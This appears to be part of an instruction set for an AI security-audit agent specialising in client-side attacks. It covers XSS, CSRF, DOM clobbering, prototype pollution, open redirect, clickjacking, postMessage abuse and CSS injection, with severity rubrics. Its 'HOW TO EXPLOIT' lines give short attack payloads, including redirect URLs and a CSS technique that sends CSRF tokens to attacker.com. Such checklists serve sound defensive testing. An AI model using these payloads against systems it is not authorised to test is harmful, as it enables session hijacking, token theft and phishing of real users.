## Agent 3: Client Attack Specialist — Client-Side Attack Specialist (client)

Comprehensively investigates attack vectors operating in browser / client environments.

### Check Items

#### 3-1. Cross-Site Scripting (XSS)

- **WHAT**: Locations where user input is output into HTML / JavaScript contexts without sanitization
- **WHERE**: Template rendering, DOM insertion of API responses, error message display

##### 3-1a. Reflected XSS

- **HOW TO EXPLOIT**: URL parameters / form inputs reflected directly in HTML (`<script>alert(1)</script>`, `" onmouseover="alert(1)`, `javascript:alert(1)`)
- **SEVERITY**:
  - Critical: No WAF + no HttpOnly on cookies → complete session hijacking path
  - High: Output location is within HTML attributes / JavaScript contexts
  - Medium: CSP exists but allows `unsafe-inline`
  - Low: Self-XSS only (no delivery path to affect other users)

##### 3-1b. Stored XSS

- **HOW TO EXPLOIT**: Persistently store scripts in comments, profiles, filenames, etc. Fires for all users who view the content
- **SEVERITY**:
  - Critical: Fires on screens viewed by admins → admin privilege takeover
  - High: Propagates between regular users (comments, messages)
  - Medium: Fires only in limited contexts (specific screens only)
  - Low: Markdown renderer flaw but CSP blocks execution

##### 3-1c. DOM-based XSS

- **WHAT**: XSS that occurs when client-side JavaScript manipulates the DOM
- **SOURCES** (attacker-controllable inputs):
  - `location.hash`, `location.search`, `location.href`
  - `document.referrer`
  - `window.name`
  - `postMessage` data
  - `localStorage` / `sessionStorage` values
  - `document.cookie`
- **SINKS** (dangerous output destinations):
  - `innerHTML`, `outerHTML`, `insertAdjacentHTML`
  - `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
  - `document.write()`, `document.writeln()`
  - `element.src`, `element.href` (especially with `javascript:` protocol)
  - `jQuery.html()`, `$.append()`, `v-html`, `dangerouslySetInnerHTML`
- **HOW TO EXPLOIT**: Trace from source to sink. Misuse of `v-html`, `dangerouslySetInnerHTML` that bypass frameworks' safe bindings (`{{}}`, `{}`)
- **SEVERITY**:
  - Critical: Direct path like `eval(location.hash.slice(1))`
  - High: `innerHTML = data` where `data` is user-controllable
  - Medium: Intermediate processing includes sanitization but it is incomplete (passes `<img onerror=...>`, etc.)
  - Low: Source is limited (`window.name` only, etc.) with strict trigger conditions

#### 3-2. Cross-Site Request Forgery (CSRF)

- **WHAT**: Attack that forces authenticated users to perform unintended actions
- **WHERE**: All state-changing endpoints (POST / PUT / DELETE / PATCH)
- **HOW TO EXPLOIT**:
  - No CSRF token → auto-submit via `<form action="target.com/transfer" method="POST">`
  - No `SameSite` cookie + no CSRF token → cookies attached to cross-site requests
  - **State change via GET**: `<img src="target.com/api/delete?id=123">` executed via image tag
  - CSRF is possible even with JSON APIs: bypass preflight with `Content-Type: text/plain`
  - CSRF via Flash / PDF (legacy environments)
- **WHY DANGEROUS**: Password changes, fund transfers, account setting modifications executed under the victim's privileges
- **SEVERITY**:
  - Critical: No CSRF protection on fund transfer / password change / email change
  - High: No CSRF protection on admin operations (user deletion, permission changes)
  - Medium: No protection on moderate-impact operations (profile updates)
  - Low: No protection on low-impact operations (theme changes, etc.)

#### 3-3. DOM Clobbering

- **WHAT**: Attack that overwrites global variables via `id` / `name` attributes on HTML elements
- **WHERE**: Code that trusts `document.getElementById` results, named property fallback references
- **HOW TO EXPLOIT**: Injecting `<img id="isAdmin" src="x">` makes `window.isAdmin` truthy. `<form id="config"><input name="apiUrl" value="https://attacker.com"></form>` spoofs object properties
- **WHY DANGEROUS**: Bypass of security checks, tampering with configuration values
- **SEVERITY**:
  - Critical: Variables used in security decisions are clobberable
  - High: API endpoint URLs or configuration values are clobberable
  - Medium: Only affects UI display
  - Low: HTML injection context where clobbering is feasible is limited

#### 3-4. Prototype Pollution

- **WHAT**: Attack that pollutes `__proto__` / `constructor.prototype` of JavaScript objects
- **WHERE**: `Object.assign()`, lodash `merge` / `set` / `defaultsDeep`, merging JSON parser output directly, query parameter parsers
- **HOW TO EXPLOIT**: Send `{"__proto__": {"isAdmin": true}}`, send `?__proto__[isAdmin]=true` as query parameter
- **WHY DANGEROUS**: Inject properties into all objects → authentication bypass, XSS (exploitation via template engines), RCE (polluting `child_process` options)
- **SEVERITY**:
  - Critical: Prototype pollution → RCE (polluting `child_process.spawn` options)
  - High: Prototype pollution → authentication bypass / XSS
  - Medium: Pollution succeeds but no exploitable sink found
  - Low: Impact exists on server side but limited to client only

#### 3-5. Open Redirect

- **WHAT**: Vulnerability that redirects users to an attacker's site
- **WHERE**: Post-login redirects (`?next=`, `?redirect=`, `?return_url=`), OAuth `redirect_uri`
- **HOW TO EXPLOIT**: `https://target.com/login?next=https://attacker.com`, `//attacker.com`, `\/\/attacker.com`, `https://target.com@attacker.com`, `javascript:alert(1)`
- **WHY DANGEROUS**: Phishing (trusted because the transition originates from a legitimate domain), OAuth token theft
- **SEVERITY**:
  - Critical: Open redirect possible in the OAuth flow's `redirect_uri`
  - High: Arbitrary URL redirect from the login page
  - Medium: Redirect target restricted to subdomains but a vulnerable subdomain exists
  - Low: Redirect target uses allowlist but the list is overly broad

#### 3-6. Clickjacking

- **WHAT**: Attack that captures user clicks by overlaying the target site with a transparent iframe
- **WHERE**: Screens with state-changing buttons (delete, approve, transfer)
- **HOW TO EXPLOIT**: No `X-Frame-Options` / CSP `frame-ancestors` → loadable in iframe → place button over a transparent iframe
- **WHY DANGEROUS**: Unintended user actions (clicking delete confirmation, granting permissions, etc.)
- **SEVERITY**:
  - Critical: Screen with one-click dangerous actions (no two-step confirmation) is iframeable
  - High: Admin screens are iframeable
  - Medium: `X-Frame-Options` exists but allows broad domains via `ALLOW-FROM`
  - Low: Iframeable but only screens without state-changing actions

#### 3-7. postMessage Abuse

- **WHAT**: Insufficient origin validation for `window.postMessage`
- **WHERE**: `addEventListener("message", handler)` handlers
- **HOW TO EXPLOIT**:
  - No `event.origin` validation → send messages from attacker's iframe
  - Incomplete validation like `event.origin.indexOf("trusted.com")` → bypass with `attacker-trusted.com`
  - Received data passed to `innerHTML` or `eval` → DOM XSS
- **WHY DANGEROUS**: XSS-equivalent attack executed via inter-iframe communication
- **SEVERITY**:
  - Critical: No origin validation + received data reaches `eval` / `innerHTML`
  - High: Incomplete origin validation (substring match)
  - Medium: Origin validated but received data sanitization is insufficient
  - Low: Message reception is confirmed but no exploitable sink exists

#### 3-8. CSS Injection

- **WHAT**: Vulnerability where user input is injected into CSS contexts
- **WHERE**: Inline styles, `<style>` tags, CSS-in-JS templates
- **HOW TO EXPLOIT**: `background: url(https://attacker.com/steal?token=` + CSS attribute selectors to extract CSRF tokens character by character (`input[value^="a"] { background: url(attacker.com/?a) }`)
- **WHY DANGEROUS**: CSRF token theft, UI spoofing (phishing), data exfiltration
- **SEVERITY**:
  - Critical: CSS injection + CSRF token in attribute value → token extraction possible
  - High: Arbitrary CSS injectable (UI spoofing, keylogger-style input capture)
  - Medium: Only partial CSS is controllable
  - Low: Sanitization exists but bypass may be possible

